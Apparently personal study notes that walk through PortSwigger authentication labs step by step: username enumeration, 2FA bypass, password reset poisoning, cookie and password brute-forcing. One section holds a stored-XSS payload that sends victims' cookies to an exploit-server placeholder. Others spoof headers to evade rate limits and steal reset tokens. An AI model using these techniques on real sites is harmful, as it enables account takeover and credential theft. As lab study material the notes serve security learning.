## [Username enumeration via different responses](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses)


- [ ] Open Burp Suite. Ensure your browser is proxied through Burp.
- [ ] Go to the lab login page and attempt a login with any credentials.
- [ ] Find the `POST /login` request in Burp Proxy > HTTP history.
- [ ] Send the login request to Burp Intruder (`Ctrl+I`).
- [ ] Clear all payload positions. Highlight the username value and click **Add §**.
  > 💡 The request should look like: `username=§test§&password=test`
- [ ] In the Payloads tab, load the candidate usernames wordlist from PortSwigger.
- [ ] Start the attack. Sort results by **Response length**.
  > 💡 A different response length indicates a valid username.
- [ ] Note the username that returns a different response (e.g., `Incorrect password` vs `Invalid username`).
- [ ] Set the found username as fixed. Now set the **password** field as the payload position.
- [ ] Load the candidate passwords wordlist from PortSwigger.
- [ ] Start the attack. Look for a **302 redirect** response or different status code.
- [ ] Use the discovered credentials to log in and access the user account page.
  > 💡 The lab is solved when you access `/my-account`.


## [2FA simple bypass](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass)

- [ ] Go to the lab login page. Log in with your own account: `wiener / peter`.
- [ ] After login, notice you are redirected to `/login2` for a 2FA code.
- [ ] After completing 2FA, observe the URL you land on: `/my-account`.
- [ ] Log out of your account.
- [ ] Log in using the victim's credentials: `carlos / montoya`.
- [ ] When redirected to `/login2` for the 2FA code, manually change the URL to `/my-account`.
  > 💡 Simply navigate directly to the authenticated page, skipping the 2FA step entirely.
- [ ] You should now be logged in as `carlos` without entering a 2FA code. Lab is solved.

## [Password reset broken logic](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic)

- [ ] Ensure Burp Suite is running and the browser is proxied.
- [ ] Click **Forgot password** on the login page. Request a reset for your own account: `wiener`.
- [ ] Open the email client (link in the lab). Click the password reset link.
- [ ] Intercept the `POST` request when you submit the new password form in Burp.
  > 💡 The request contains a `temp-forgot-password-token` parameter.
- [ ] Note all parameters: `username`, `new-password-1`, `new-password-2`, `token`.
- [ ] Send the captured POST request to Burp Repeater.
- [ ] Change the `username` parameter value from `wiener` to `carlos`.
  > 💡 Keep the valid token from your own reset flow.
- [ ] Send the modified request in Repeater. You should get a 302 or success response.
- [ ] Go to the login page. Log in as `carlos` with your newly set password.
- [ ] Access carlos's account page. Lab is solved.

## [Username enumeration via subtly different responses](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses)

- [ ] Open Burp Suite with Proxy enabled.
- [ ] Attempt a login with dummy credentials. Send the `POST /login` request to Burp Intruder.
- [ ] Clear all positions. Mark the **username** field as the payload position.
- [ ] Load the PortSwigger candidate usernames wordlist as the payload.
- [ ] In Intruder > Options, add a **Grep - Extract** rule to extract the error message text from the response.
  > 💡 Use the error message like `Invalid username or password.` as the extraction pattern.
- [ ] Run the attack. In results, look at the extracted error column.
  > 💡 One username will have a subtly different message — e.g., missing trailing period or a different phrase.
- [ ] Identify the username with the different response text.
- [ ] Set that username as fixed. Set the **password** field as the new payload position.
- [ ] Load the PortSwigger candidate passwords wordlist.
- [ ] Run the attack. Find the response with status **302** or different length.
- [ ] Log in with the found credentials to solve the lab.

## [Username enumeration via response timing](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing)

- [ ] Open Burp Suite. Enable Proxy and navigate to the login page.
- [ ] Attempt login and capture the `POST /login` request. Send to Intruder.
- [ ] Add the header `X-Forwarded-For: 1` to the request.
  > 💡 The server may trust this header to identify the originating IP — used to bypass IP rate limiting.
- [ ] Set two payload positions: `§1§` on the `X-Forwarded-For` IP value, and `§2§` on the username field. Use **Pitchfork** attack type.
- [ ] Set Payload 1 (IP) to a sequential numbers list (1–100) to spoof different IPs.
- [ ] Set a very long string (100+ chars) as the fixed password value.
  > 💡 A valid username causes the server to hash the long password — taking measurably longer.
- [ ] Set Payload 2 (username) to the PortSwigger username wordlist.
- [ ] Run the Pitchfork attack. In results, enable the **Response received** timing column.
- [ ] Find the username where the response time is significantly longer — that's a valid username.
- [ ] Fix the found username. Use a new Pitchfork attack spoofing IPs again with password as the second payload.
- [ ] Use the PortSwigger password wordlist for the second payload.
- [ ] Identify the password that returns a **302**. Log in with the discovered credentials.

## [Broken brute-force protection, IP block](https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block)

- This lab will lock you out after 3 fialed login attempst but 1 succeful attemt will reset the amout of attempts. 
- Create a list with to brute for usernames with this comamnd:

seq 60 | xargs -I{} echo -e 'carlos\ncarlos\nwiener' 2>/dev/null | head -150

- Use this command to create the password list with the list provided by portswigger.

awk '{print} NR % 2 == 0 {print "peter"}' passwords.txt 

- Run pitchfork attack with the username password list.

## [Username enumeration via account lock](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock)


- With Burp running, investigate the login page and submit an invalid username and password. Send the `POST /login` request to Burp Intruder.
- Select **Cluster bomb attack** from the attack type drop-down menu. Add a payload position to the `username` parameter. Add a blank payload position to the end of the request body by clicking **Add §**. The result should look something like this:
    
    `username=§invalid-username§&password=example§§`
- In the **Payloads** side panel, add the list of usernames for the first payload position. For the second payload position, select the **Null payloads** type and choose the option to generate 5 payloads. This will effectively cause each username to be repeated 5 times. Start the attack.
- In the results, notice that the responses for one of the usernames were longer than responses when using other usernames. Study the response more closely and notice that it contains a different error message: `You have made too many incorrect login attempts.` Make a note of this username.
- Create a new Burp Intruder attack on the `POST /login` request, but this time select **Sniper attack** from the attack type drop-down menu. Set the `username` parameter to the username that you just identified and add a payload position to the `password` parameter.
- Add the list of passwords to the payload set and create a grep extraction rule for the error message. Start the attack.
- In the results, look at the grep extract column. Notice that there are a couple of different error messages, but one of the responses did not contain any error message. Make a note of this password.
- Wait for a minute to allow the account lock to reset. Log in using the username and password that you identified and access the user account page to solve the lab.
## [2FA broken logic](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic)

- With Burp running, log in to your own account and investigate the 2FA verification process. Notice that in the `POST /login2` request, the `verify` parameter is used to determine which user's account is being accessed.
- Log out of your account.
- Send the `GET /login2` request to Burp Repeater. Change the value of the `verify` parameter to `carlos` and send the request. This ensures that a temporary 2FA code is generated for Carlos.
- Go to the login page and enter your username and password. Then, submit an invalid 2FA code.
- Send the `POST /login2` request to Burp Intruder.
- In Burp Intruder, set the `verify` parameter to `carlos` and add a payload position to the `mfa-code` parameter. Brute-force the verification code.
- Load the 302 response in the browser.
- Click **My account** to solve the lab.

## [Brute-forcing a stay-logged-in cookie](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)

- With Burp running, log in to your own account with the **Stay logged in** option selected. Notice that this sets a `stay-logged-in` cookie.
- Examine this cookie in the [Inspector](https://portswigger.net/burp/documentation/desktop/tools/inspector) panel and notice that it is Base64-encoded. Its decoded value is `wiener:51dc30ddc473d43a6011e9ebba6ca770`. Study the length and character set of this string and notice that it could be an MD5 hash. Given that the plaintext is your username, you can make an educated guess that this may be a hash of your password. Hash your password using MD5 to confirm that this is the case. We now know that the cookie is constructed as follows:
    
    `base64(username+':'+md5HashOfPassword)`
- Log out of your account.
- In the most recent `GET /my-account?id=wiener` request highlight the `stay-logged-in` cookie parameter and send the request to Burp Intruder.
- In Burp Intruder, notice that the `stay-logged-in` cookie has been automatically added as a payload position. Add your own password as a single payload.
- Under **Payload processing**, add the following rules in order. These rules will be applied sequentially to each payload before the request is submitted.
    - Hash: `MD5`
    - Add prefix: `wiener:`
    - Encode: `Base64-encode`
- As the **Update email** button is only displayed when you access the **My account** page in an authenticated state, we can use the presence or absence of this button to determine whether we've successfully brute-forced the cookie. In the **Settings** side panel, add a grep match rule to flag any responses containing the string `Update email`. Start the attack.
- Notice that the generated payload was used to successfully load your own account page. This confirms that the payload processing rules work as expected and you were able to construct a valid cookie for your own account.
- Make the following adjustments and then repeat this attack:
    - Remove your own password from the payload list and add the list of [candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords) instead.
    - Change the `id` parameter in the request URL to `carlos` instead of `wiener`.
    - Change the **Add prefix** rule to add `carlos:` instead of `wiener:`.
    - Remove the **session** cookie.
- When the attack is finished, the lab will be solved. Notice that only one request returned a response containing `Update email`. The payload from this request is the valid `stay-logged-in` cookie for Carlos's account.

## [Offline password cracking](https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking)

- [ ] The lab has a comment function with a stored XSS vulnerability.
- [ ] Post a comment containing: `<script>document.location='https://YOUR-EXPLOIT-SERVER/'+document.cookie</script>`
  > 💡 Replace `YOUR-EXPLOIT-SERVER` with your assigned exploit server hostname.
- [ ] Wait for the admin/victim to view the post. Their cookie will be sent to your exploit server.
- [ ] Go to your exploit server. Check the **access logs** for a request containing the victim's cookies.
- [ ] Find the `stay-logged-in` cookie value in the logs. Copy it.
- [ ] Base64-decode the cookie value. You'll get: `carlos:<MD5 hash>`
- [ ] Take the MD5 hash to an online cracker (e.g., crackstation.net) or use hashcat.
  > 💡 The password is likely in a common wordlist. Crackstation should find it instantly.
- [ ] Log in as `carlos` with the cracked password.
- [ ] Go to carlos's account page and click **Delete account** to solve the lab.

## [Password reset poisoning via middleware](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware)

- [ ] Trigger a password reset for your own account: `wiener`.
- [ ] Intercept the `POST /forgot-password` request in Burp. Send it to Repeater.
- [ ] Add the header `X-Forwarded-Host: YOUR-EXPLOIT-SERVER` to the request.
  > 💡 The server uses this header to build the reset link instead of the real hostname.
- [ ] Change the `username` parameter to `carlos`. Keep your exploit server as `X-Forwarded-Host`.
- [ ] Send the request. The password reset email for carlos will contain a link pointing to your exploit server.
- [ ] Check your exploit server access logs. You'll see a request to `/forgot-password?temp-forgot-password-token=<TOKEN>`.
- [ ] Copy the token value from the log.
- [ ] Navigate to the real lab's password reset URL with the stolen token: `/forgot-password?temp-forgot-password-token=<TOKEN>`
- [ ] Set a new password for `carlos` using the form.
- [ ] Log in as `carlos` with your new password. Access `/my-account` to solve the lab.

## [Password brute-force via password change](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change)

- [ ] Log in with your own account: `wiener / peter`.
- [ ] Navigate to the password change function (`/my-account/change-password`).
- [ ] Submit a password change and intercept the `POST` request in Burp. Send to Repeater.
- [ ] Note the parameters: `username`, `current-password`, `new-password-1`, `new-password-2`.
- [ ] Observe the behavior:
  > 💡 Wrong current password + matching new passwords → `Current password is incorrect`. Wrong current password + mismatched new passwords → different error. This difference leaks whether the current password was valid.
- [ ] Send the request to Intruder. Set `current-password` as the payload position.
- [ ] Change `username` to `carlos`. Set `new-password-1` and `new-password-2` to **mismatched** values.
  > 💡 E.g., `new-password-1=newpass1` and `new-password-2=newpass2`
- [ ] Load the PortSwigger password wordlist as the payload.
- [ ] Add a grep match rule for `New passwords do not match` — this fires when the current password **is** correct.
- [ ] Run the attack. Identify the payload that triggers the `New passwords do not match` response.
- [ ] Log in as `carlos` with the found password.
- [ ] Access carlos's account page to solve the lab.



